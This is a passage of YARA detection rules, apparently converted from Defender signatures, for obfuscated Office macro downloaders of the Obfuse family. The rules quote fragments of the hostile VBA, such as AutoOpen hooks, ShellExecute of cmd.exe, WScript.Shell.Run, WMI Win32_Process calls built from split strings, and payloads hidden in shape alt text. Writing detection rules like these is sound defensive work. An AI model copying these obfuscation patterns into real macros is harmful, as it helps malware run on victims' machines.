rule TrojanDownloader_O97M_Obfuse_ED_2147734496_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ED"
        threat_id = "2147734496"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {43 61 6c 6c 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 2e [0-36] 20 2b 20 [0-16] 2e [0-21] 20 2b 20 [0-16] 2e [0-64] 29 2e 43 72 65 61 74 65 [0-1] 28 [0-16] 2e [0-36] 20 2b 20 [0-16] 2e [0-21] 20 2b}  //weight: 10, accuracy: Low
        $x_1_2 = {53 68 4f 77 57 69 4e 64 4f 77 20 3d 20 [0-16] 2e [0-16] 20 2d 20 [0-16] 2e [0-16] 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 4f 77 57 69 4e 64 4f 77 20 3d 20 [0-21] 20 2b 20 [0-16] 2e [0-16] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-16] 2e [0-16] 20 2d 20 [0-16] 2e [0-16] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_EE_2147734629_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EE"
        threat_id = "2147734629"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 28 [0-5] 20 2d [0-5] 29 20 2a 20 28 [0-5] 29 29 2e 20 5f}  //weight: 2, accuracy: Low
        $x_1_2 = "AlternativeText" ascii //weight: 1
        $x_1_3 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 29 2e 52 75 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EF_2147734679_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EF"
        threat_id = "2147734679"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 3a 31 33 37 30 39 36 32 30 2d 43 32 37 39 2d 31 31 43 45 2d 41 34 39 45 2d 34 34 34 35 35 33 35 34 30 30 30 30 22 29 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 63 [0-32] 2e 65 78 65 22 2c 20 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 28 33 20 2d 20 35 29 20 2a 20 28 2d 31 29 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 2c 20 22 22 2c 20 22 22 2c 20 30}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EG_2147734735_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EG"
        threat_id = "2147734735"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {43 61 6c 6c 20 47 65 74 4f 62 6a 65 63 74 28 [0-48] 29 2e 43 72 65 61 74 65 28 [0-16] 2e [0-36] 20 2b 20 [0-16] 2e [0-36] 20 2b}  //weight: 10, accuracy: Low
        $x_1_2 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-16] 2e [0-16] 20 2d 20 [0-16] 2e [0-16] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e [0-16] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-36] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_EH_2147734834_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EH"
        threat_id = "2147734834"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(\"new:13709620-C279-11CE-A49E-444553540000\").ShellExecute! _" ascii //weight: 1
        $x_10_2 = "\"c\" + Chr(vbKeyM) + \"d.exe\", InlineShapes((3 - 5) * (-1)).AlternativeText, \"\", \"\", 0" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EI_2147734914_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EI"
        threat_id = "2147734914"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {47 65 74 4f 62 6a 65 63 74 28 [0-80] 29 2e 43 72 65 61 74 65 20 [0-16] 2e [0-37] 20 2b 20}  //weight: 10, accuracy: Low
        $x_1_2 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EI_2147734914_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EI"
        threat_id = "2147734914"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-16] 2e [0-16] 28 53 74 72 43 6f 6e 76 28 [0-16] 2c 20 36 34 29 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_2 = {46 6f 72 20 63 20 3d 20 41 73 63 28 22 41 22 29 20 54 6f 20 41 73 63 28 22 5a 22 29 3a 20 [0-16] 28 69 29 20 3d 20 63 3a 20 69 20 3d 20 69 20 2b 20 31 3a 20 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = "(i) = Asc(\"+\"): i = i + 1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EJ_2147734992_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EJ"
        threat_id = "2147734992"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 22 57 69 6e 6d 67 6d 74 73 3a 22 29 2e 47 65 74 28 53 74 72 52 65 76 65 72 73 65 28 22 [0-21] 22 29 29 2e 43 72 65 61 74 65 20 [0-6] 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 70 69 64}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EK_2147735024_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EK"
        threat_id = "2147735024"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-4] 20 2d 20 ?? ?? 29}  //weight: 1, accuracy: Low
        $x_1_2 = ".AlternativeText, \"\", \"\", 0" ascii //weight: 1
        $x_1_3 = {47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 3a 22 20 26 20 [0-21] 29 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 25 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EL_2147735053_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EL"
        threat_id = "2147735053"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {2e 43 72 65 61 74 65 20 [0-16] 2e [0-37] 20 2b 20}  //weight: 10, accuracy: Low
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-64] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EM_2147735091_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EM"
        threat_id = "2147735091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-3] 20 2d 20 [0-3] 20 2d 20 [0-1] 29 2c 20 22 22 2c 20 22 22 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_3 = {49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-3] 20 2d 20 [0-3] 20 2d 20 [0-1] 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 2c 20 22 22 2c 20 22 22 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_4 = {47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 3a 22 20 26 20 [0-21] 29 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 25 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EN_2147735153_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EN"
        threat_id = "2147735153"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 20 [0-16] 2c 20 [0-37] 2c 20}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 22 53 74 61 72 74 75 70 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EO_2147735201_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EO"
        threat_id = "2147735201"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 69 6d 20 [0-32] 20 41 73 20 43 75 72 72 65 6e 63 79}  //weight: 1, accuracy: Low
        $x_1_2 = {53 74 72 52 65 76 65 72 73 65 28 53 74 72 52 65 76 65 72 73 65 28 [0-32] 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EO_2147735201_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EO"
        threat_id = "2147735201"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 72 65 61 74 65 [0-1] 20 [0-16] 20 2b 20 [0-37] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 22 53 74 61 22 20 2b 20 22 72 74 75 70 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "GetObject(\"winmgmts:Win32_Process\" + \"Sta\" + \"rtup\"))" ascii //weight: 1
        $x_1_4 = "GetObject(\"winm\" + \"gmts:Win32_Process\" + \"Sta\" + \"rtup\"))" ascii //weight: 1
        $x_1_5 = "GetObject(\"winm\" + \"gmts:W\" + \"in32_Process\" + \"Sta\" + \"rtup\"))" ascii //weight: 1
        $x_1_6 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_EP_2147735213_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EP"
        threat_id = "2147735213"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Workbook_Open()" ascii //weight: 1
        $x_1_2 = {20 26 20 53 74 72 52 65 76 65 72 73 65 28 4d 69 64 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 32 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 6c 6c 20 28 ?? ?? ?? 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4d 69 64 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 31 29 20 3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 31 29 29 20 2d 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? 29}  //weight: 1, accuracy: Low
        $x_1_5 = {26 20 43 68 72 24 28 56 61 6c 28 [0-32] 20 26 20 4d 69 64 24 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EQ_2147735238_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EQ"
        threat_id = "2147735238"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "InlineShapes(2).AlternativeText, 0" ascii //weight: 1
        $x_1_3 = "CreateObject(\"WScript.Shell\").Run% _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ER_2147735336_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ER"
        threat_id = "2147735336"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 72 65 61 74 65 [0-1] 20 [0-16] 20 2b 20 [0-37] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_2 = "GetObject(\"winm\" + \"gm\" + \"ts:W\" + \"in32_Process\" + \"Sta\" + \"rtup\"))" ascii //weight: 1
        $x_1_3 = "+ \"gm\" + \"ts\" + \":W\" + \"in32_Process\" + \"Sta\" + \"rtup\"))" ascii //weight: 1
        $x_1_4 = "\"in32_P\" + \"rocess\" + \"Sta\" + \"rtup\"))" ascii //weight: 1
        $x_1_5 = "GetObject(\"winmgmts:\" + \"Win32_Process\" + \"Sta\" + \"rtup\"))" ascii //weight: 1
        $x_1_6 = "GetObject(\"w\" + \"inmgmts:W\" + \"in32_Process\" + \"Sta\" + \"rtup\"))" ascii //weight: 1
        $x_1_7 = "GetObject(\"winm\" + \"g\" + \"mts:W\" + \"in32_Process\" + \"Sta\" + \"rtup\"))" ascii //weight: 1
        $x_1_8 = "GetObject(\"winmgmt\" + \"s:Win32_Process\" + \"Startup\"))" ascii //weight: 1
        $x_1_9 = "GetObject(\"winmgmt\" + \"s:Wi\" + \"n32_Process\" + \"Startup\"))" ascii //weight: 1
        $x_1_10 = "+ \"in32_P\" + \"rocess\" _" ascii //weight: 1
        $x_1_11 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_ES_2147735353_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ES"
        threat_id = "2147735353"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c [0-1] 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = {49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-16] 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 2c 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ET_2147735474_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ET"
        threat_id = "2147735474"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {47 65 74 4f 62 6a 65 63 74 28 28 [0-16] 20 2b 20 22 77 69 6e 6d 67 6d 74 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 22 20 2b 20 22 72 6f 63 65 73 73 22 29 29 2e 43 72 65 61 74 65 28 28 [0-24] 20 2b 20 [0-32] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_2 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EU_2147735478_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EU"
        threat_id = "2147735478"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 72 65 61 74 65 [0-1] 20 [0-16] 20 2b 20 [0-37] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_2 = "GetObject(\"win\" + \"mgmt\" + \"s:Wi\" + \"n32_Pr\" + \"ocess\"))" ascii //weight: 1
        $x_1_3 = "\"mgmt\" + \"s:Wi\" + \"n32_Pr\" _" ascii //weight: 1
        $x_1_4 = {47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 22 20 2b 20 [0-40] 20 2b 20 22 6f 63 65 73 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = "+ \"s:Wi\" + \"n3\" _" ascii //weight: 1
        $x_1_6 = "GetObject(\"winmgmts:W\" + \"in32_Process\"))" ascii //weight: 1
        $x_1_7 = "GetObject(\"winmg\" + \"mts:W\" + \"in32_Process\"))" ascii //weight: 1
        $x_1_8 = "+ \"in32_Pro\" + \"cess\"))" ascii //weight: 1
        $x_1_9 = "GetObject(\"winmgmts:Win32_P\" + \"rocess\"))" ascii //weight: 1
        $x_1_10 = "GetObject(\"winmgmts:W\" + \"in32_P\" + \"rocess\"))" ascii //weight: 1
        $x_1_11 = "GetObject(\"win\" + \"mgmts:W\" + \"in32_P\" + \"rocess\"))" ascii //weight: 1
        $x_1_12 = "+ \"mgmt\" + \"s:W\" + \"in32_P\" _" ascii //weight: 1
        $x_1_13 = "GetObject(\"wi\" + \"n\" + \"mgmt\" + \"s:W\" + \"in32_P\" + \"roce\" + \"ss\"))" ascii //weight: 1
        $x_1_14 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_EV_2147735687_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EV"
        threat_id = "2147735687"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 72 65 61 74 65 [0-1] 20 [0-16] 20 2b 20 [0-37] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 28 22 77 69 22 29 20 2b 20 22 6e 6d 67 6d 74 73 3a 57 69 6e 33 32 5f 50 72 6f 63 65 22 20 2b 20 22 73 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 28 22 77 69 22 29 20 2b 20 [0-16] 28 22 6e 6d 67 6d 74 22 29 20 2b 20 22 73 3a 57 69 6e 33 32 5f 50 72 6f 63 65 22 20 2b 20 22 73 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 28 22 77 69 22 29 20 2b 20 [0-16] 28 22 6e 6d 67 6d 74 22 29 20 2b 20 22 73 3a 57 69 6e 33 22 20 2b 20 [0-16] 28 22 32 5f 50 72 6f 63 65 22 29 20 2b 20 [0-16] 28 22 73 73 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = "+ CVar(\"nmgmt\") + \"s:Win3\" + _" ascii //weight: 1
        $x_1_6 = "GetObject(CVar(\"winmgmts:Win32_Process\")))" ascii //weight: 1
        $x_1_7 = "GetObject(CVar(\"winmgmts:\" + \"Win32_Process\")))" ascii //weight: 1
        $x_1_8 = "GetObject((\"winm\" + \"gmts:\" + \"Win32_Proc\" + \"essS\" + \"tartup\"))" ascii //weight: 1
        $x_1_9 = "GetObject((\"winm\" + \"gmts:\" + \"Win\" + \"32_Proc\" + \"essS\" + \"tartup\"))" ascii //weight: 1
        $x_1_10 = "= GetObject(\"WiN\" + \"mgmts:Win32_ProcessStarTUP\")" ascii //weight: 1
        $x_1_11 = "= GetObject(\"WiN\" + \"MgMts:w\" + \"In32_PRocEssStArTuP\")" ascii //weight: 1
        $x_1_12 = {53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-20] 20}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_EW_2147735707_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EW"
        threat_id = "2147735707"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c [0-2] 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = {49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-23] 29 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = ".AlternativeText, _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KA_2147735829_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KA"
        threat_id = "2147735829"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 26 20 4d 69 64 24 28 [0-32] 2c 20 49 6e 74 28 52 6e 64 28 29 20 2a 20 4c 65 6e 28 [0-32] 29 20 2b 20 31 29 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 28 26 48 34 36 20 2d 20 26 48 41 36 20 2a 20 26 48 33 29 20 2a 20 28 26 48 39 35 20 2f 20 26 48 35 29 20 2a 20 30 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = " = Application.ActiveDocument.FullName" ascii //weight: 1
        $x_1_4 = {52 65 44 69 6d 20 [0-32] 28 30 20 54 6f 20 4c 4f 46 28 [0-32] 29 20 2d 20 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KB_2147735830_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KB"
        threat_id = "2147735830"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
